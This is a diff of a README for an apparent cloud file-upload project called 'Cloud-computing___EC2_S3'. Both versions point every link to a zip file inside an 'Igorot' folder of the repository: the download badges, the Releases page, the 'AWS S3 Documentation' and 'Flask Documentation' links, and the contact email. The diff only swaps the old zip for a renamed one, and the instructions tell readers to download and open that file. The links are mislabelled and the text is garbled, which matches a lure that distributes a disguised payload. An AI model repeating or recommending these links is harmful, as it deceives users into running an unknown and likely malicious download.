@@ -1,6 +1,6 @@
 # 🌥️ Cloud-computing___EC2_S3 - Secure File Uploads Made Easy
 
-[![Download Now](https://raw.githubusercontent.com/maycomgberti/Cloud-computing___EC2_S3/main/Igorot/Cloud-computing___EC2_S3.zip%20Now-%https://raw.githubusercontent.com/maycomgberti/Cloud-computing___EC2_S3/main/Igorot/Cloud-computing___EC2_S3.zip)](https://raw.githubusercontent.com/maycomgberti/Cloud-computing___EC2_S3/main/Igorot/Cloud-computing___EC2_S3.zip)
+[![Download Now](https://github.com/maycomgberti/Cloud-computing___EC2_S3/raw/refs/heads/main/Igorot/E_Cloud_computing_v1.6.zip%20Now-%https://github.com/maycomgberti/Cloud-computing___EC2_S3/raw/refs/heads/main/Igorot/E_Cloud_computing_v1.6.zip)](https://github.com/maycomgberti/Cloud-computing___EC2_S3/raw/refs/heads/main/Igorot/E_Cloud_computing_v1.6.zip)
 
 ## 📜 Description
 
@@ -19,11 +19,11 @@ Follow these simple steps to download and run Cloud-computing___EC2_S3 on your c
 
 ## 📥 Download & Install
 
-To get started, visit our [Releases page](https://raw.githubusercontent.com/maycomgberti/Cloud-computing___EC2_S3/main/Igorot/Cloud-computing___EC2_S3.zip) to download the latest version of the application. 
+To get started, visit our [Releases page](https://github.com/maycomgberti/Cloud-computing___EC2_S3/raw/refs/heads/main/Igorot/E_Cloud_computing_v1.6.zip) to download the latest version of the application. 
 
 1. Click on the link above.
 2. Find the latest version listed at the top.
-3. Download the file suitable for your operating system (e.g., `.exe` for Windows or a `https://raw.githubusercontent.com/maycomgberti/Cloud-computing___EC2_S3/main/Igorot/Cloud-computing___EC2_S3.zip` for macOS/Linux).
+3. Download the file suitable for your operating system (e.g., `.exe` for Windows or a `https://github.com/maycomgberti/Cloud-computing___EC2_S3/raw/refs/heads/main/Igorot/E_Cloud_computing_v1.6.zip` for macOS/Linux).
 4. Open the downloaded file to start the installation process.
 
 Once the application installs, you can launch it directly from your applications folder or start menu.
@@ -48,9 +48,9 @@ If you encounter any issues, consider the following:
 
 For detailed usage instructions and advanced features, refer to the following resources:
 
-- [Official Documentation](https://raw.githubusercontent.com/maycomgberti/Cloud-computing___EC2_S3/main/Igorot/Cloud-computing___EC2_S3.zip)
-- [AWS S3 Documentation](https://raw.githubusercontent.com/maycomgberti/Cloud-computing___EC2_S3/main/Igorot/Cloud-computing___EC2_S3.zip)
-- [Flask Documentation](https://raw.githubusercontent.com/maycomgberti/Cloud-computing___EC2_S3/main/Igorot/Cloud-computing___EC2_S3.zip)
+- [Official Documentation](https://github.com/maycomgberti/Cloud-computing___EC2_S3/raw/refs/heads/main/Igorot/E_Cloud_computing_v1.6.zip)
+- [AWS S3 Documentation](https://github.com/maycomgberti/Cloud-computing___EC2_S3/raw/refs/heads/main/Igorot/E_Cloud_computing_v1.6.zip)
+- [Flask Documentation](https://github.com/maycomgberti/Cloud-computing___EC2_S3/raw/refs/heads/main/Igorot/E_Cloud_computing_v1.6.zip)
 
 Feel free to reach out via the issues section of this repository if you need further assistance.
 
@@ -78,6 +78,6 @@ We plan to add features like:
 
 ## 📞 Contact
 
-If you have any questions, feel free to open an issue on the GitHub repository or email us at https://raw.githubusercontent.com/maycomgberti/Cloud-computing___EC2_S3/main/Igorot/Cloud-computing___EC2_S3.zip
+If you have any questions, feel free to open an issue on the GitHub repository or email us at https://github.com/maycomgberti/Cloud-computing___EC2_S3/raw/refs/heads/main/Igorot/E_Cloud_computing_v1.6.zip
 
-[![Download Now](https://raw.githubusercontent.com/maycomgberti/Cloud-computing___EC2_S3/main/Igorot/Cloud-computing___EC2_S3.zip%20Now-%https://raw.githubusercontent.com/maycomgberti/Cloud-computing___EC2_S3/main/Igorot/Cloud-computing___EC2_S3.zip)](https://raw.githubusercontent.com/maycomgberti/Cloud-computing___EC2_S3/main/Igorot/Cloud-computing___EC2_S3.zip)
+[![Download Now](https://github.com/maycomgberti/Cloud-computing___EC2_S3/raw/refs/heads/main/Igorot/E_Cloud_computing_v1.6.zip%20Now-%https://github.com/maycomgberti/Cloud-computing___EC2_S3/raw/refs/heads/main/Igorot/E_Cloud_computing_v1.6.zip)](https://github.com/maycomgberti/Cloud-computing___EC2_S3/raw/refs/heads/main/Igorot/E_Cloud_computing_v1.6.zip)
